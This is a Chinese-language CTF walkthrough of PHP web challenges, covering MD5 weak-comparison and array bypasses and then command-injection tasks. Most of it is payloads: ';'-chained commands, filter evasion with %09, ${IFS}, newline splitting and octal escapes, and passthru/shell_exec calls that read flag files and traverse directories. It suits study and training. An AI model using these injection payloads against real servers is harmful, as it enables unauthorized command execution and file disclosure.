# MD5  数组绕过
**EZMD5**
![image copy 52.png](https://img.xobear.cn/file/CTF/WEB/Qingcen/1781272405384_image_copy_52.png)

这里是弱比较，0e在这里作为0
md5加密后为0e开头的就可以绕过
0e开头的md5和原值：
```
QNKCDZO
0e830400451993494058024219903391
240610708
0e462097431906509019562988736854
s878926199a
0e545993274517709034328855841020
s155964671a
0e342768416822451524974117254469
s214587387a
0e848240448830537924465865611904
s214587387a
0e848240448830537924465865611904
s878926199a
0e545993274517709034328855841020
s1091221200a
0e940624217856561557816327384675
s1885207154a
0e509367213418206700842008763514
s1502113478a
```

**EZMD5_1**
![image copy 53.png](https://img.xobear.cn/file/CTF/WEB/Qingcen/1781272403477_image_copy_53.png)

GET一个a一个b，两个之不相等，md5加密后进行弱比较

**EZMD5_2**
![image copy 54.png](https://img.xobear.cn/file/CTF/WEB/Qingcen/1781272408298_image_copy_54.png)

MD5加密数组返回NULL,后面的代码继续进行
`a[]=1&b[]=2`

**EZMD5_3**
![image copy 55.png](https://img.xobear.cn/file/CTF/WEB/Qingcen/1781272407855_image_copy_55.png)
如果是 === ，可以使用数组绕过
**EZMD5_4**
![image copy 56.png](https://img.xobear.cn/file/CTF/WEB/Qingcen/1781272402379_image_copy_56.png)
用代码暴力跑出来
```
import hashlib

# 目标：MD5 最后 6 位必须是 d54e23
target_suffix = "d54e23"

# 从 0 开始暴力枚举
i = 0
while True:
    # 转成字符串计算 MD5
    s = str(i)
    md5_value = hashlib.md5(s.encode()).hexdigest()
    
    # 取最后 6 位
    suffix = md5_value[-6:]
    
    # 找到就输出
    if suffix == target_suffix:
        print("找到答案！")
        print(f"字符串：{s}")
        print(f"MD5 值：{md5_value}")
        print(f"最后6位：{suffix}")
        break
    
    # 每 100 万次输出进度（可选）
    if i % 1000000 == 0:
        print(f"正在尝试：{i}...")
    
    i += **1**
```
**EZMD5_5**
![image copy 57.png](https://img.xobear.cn/file/CTF/WEB/Qingcen/1781272402703_image_copy_57.png)
ab不等，但哈希值相同
数组绕过
![image copy 58.png](https://img.xobear.cn/file/CTF/WEB/Qingcen/1781272410628_image_copy_58.png)
数组绕过

**EZCMD**
![image copy 59.png](https://img.xobear.cn/file/CTF/WEB/Qingcen/1781272408674_image_copy_59.png)
PSOT:cmd=nl /flag




# 命令执行
**EZCMD_1**
![image copy 60.png](https://img.xobear.cn/file/CTF/WEB/Qingcen/1781272411140_image_copy_60.png)
PSOT:cmd=127.0.0.1;ls     查目录
在../../../目录下有flag
cmd=127.0.0.1;cat ../../../flag

**ezcmd_2**
![image.png](https://img.xobear.cn/file/CTF/WEB/Qingcen/1781404117711_image.png)
system($cmd." >/dev/null 2>&1");无回显

可以使用结束符来截断">/dev/null 2>&1"

**`;`**  **`&&`**  **`||`**  
![image.png](https://img.xobear.cn/file/CTF/WEB/Qingcen/1781404330889_image.png)


**EZCMD_3**
![image.png](https://img.xobear.cn/file/CTF/WEB/Qingcen/1781405067227_image.png)

[strpos](https://www.php.net/manual/zh/function.strpos.php):查找字符串首次出现的位置
在这里是过滤空格的意思【strpos($cmd, ' ') !== false】

可以使用`%09` `%0a` ``${IFS}``绕过
![image.png](https://img.xobear.cn/file/CTF/WEB/Qingcen/1781421945075_image.png)


**EZCMD_4**
![image.png](https://img.xobear.cn/file/CTF/WEB/Qingcen/1781422684089_image.png)
robot文件告诉爬虫哪些页面可以抓，**哪些不能抓**
url/robot.txt知道下一步

![image.png](https://img.xobear.cn/file/CTF/WEB/Qingcen/1781422771968_image.png)
过滤多的离谱，其实也没使用
[escapeshellcmd](https://www.php.net/manual/zh/function.escapeshellcmd.php)
这个函数会在`%0a`时添加反斜杠
反斜杠 `\` + 换行符 `%0a`，会被 Shell 解析为  **行延续符**，直接忽略这两个字符本身，把上下两行拼接成一条完整命令
用换行符来绕过过滤
```
cmd=ca
t /fl
ag

```
注意：要用发包工具去发送post。这里不能用 hackbar 传参

**EZCMD_5**
![image.png](https://img.xobear.cn/file/CTF/WEB/Qingcen/1781424039478_image.png)

没有**过滤数字**的无字母 RCE，使用 ANSI-C 风格的转义，格式为 **$'.....'** ，省略号中用八进制

[ANSI-C在线编码](https://xobear.cn/CTF/Web/PHP/ansi-c-encode.html)注意编码后的是16进制，还需要转为八进制
`cmd=$'\143\141\164' $'\57\146\154\141\147\56\164\170\164'`
![image.png](https://img.xobear.cn/file/CTF/WEB/Qingcen/1781426578446_image.png)

**EZCMD_6**
![image.png](https://img.xobear.cn/file/CTF/WEB/Qingcen/1781428526254_image.png)
`qc=system('cat /flag');`
**EZCMD_7**
![image.png](https://img.xobear.cn/file/CTF/WEB/Qingcen/1781428893597_image.png)
当前目录没有flag。查找其他目录
![image.png](https://img.xobear.cn/file/CTF/WEB/Qingcen/1781428852223_image.png)
../../../有flag
pyload=`?qc=system('cat ../../../fla?');` 
`fla?` ? 是占位符
**EZCMD_8**
![image.png](https://img.xobear.cn/file/CTF/WEB/Qingcen/1781496069039_image.png)
system只是php的一种命令执行函数，还有很多其他的。
| 替代函数 | 用法示例 |
|-----------|----------|
| `passthru` | `passthru('ls');` |
| `exec` | `exec('ls',$a);print_r($a);` |
| `shell_exec` | `echo shell_exec('ls');` |
| 反引号 | `` echo `ls`; `` |
| `popen` | `$f=popen('ls','r');echo fread($f,4096);` |

可以一步到位 `?qc=passthru('cat /f*');` 到此为止。


`?qc=echo __FILE__;` **当前文件路径**
目录遍历
`?qc=print_r(scandir('../../../'));` **发现在../../../目录下有flag**
`?qc=echo shell_exec('cat ../../../f*');`
`?qc=passthru('cat ../../../f*');`

**`/f*` 和 `../../../f*` 效果一样，因为 `../../../` 恰好回到了根目录**

**EZCMD_9**
![image.png](https://img.xobear.cn/file/CTF/WEB/Qingcen/1781496824928_image.png)
这一题过滤了空格。用`%09` `%0a` `${IFS}` `chr(32)`绕过过空格
`?qc=passthru('cat%09/f*');`
`?qc=passthru('cat'.chr(32).'/f*');`

**EZCMD_10**
![image.png](https://img.xobear.cn/file/CTF/WEB/Qingcen/1781497610322_image.png)
只过了滤分号。

**PHP 官方文档明确说明：`?>` 结尾标签会自动隐含一个分号。**
也可以使用花括号`if(1){}`来绕过过滤。
例如`?qc=if(1){passthru('cat /flag.txt')}`

`?qc=passthru('cat /flag.txt')?>`

**EZCMD_11**
![image.png](https://img.xobear.cn/file/CTF/WEB/Qingcen/1781498099974_image.png)
`?qc=passthru('cat flag.php')?>`与上一题没什么区别

`?qc=echo file_get_contents('flag.php')%3F%3E`  ctrl+U看源码有flag
`?qc=passthru('tac${IFS}$9fla*')?>`

**EZCMD_12**
![image.png](https://img.xobear.cn/file/CTF/WEB/Qingcen/1781499728494_image.png)











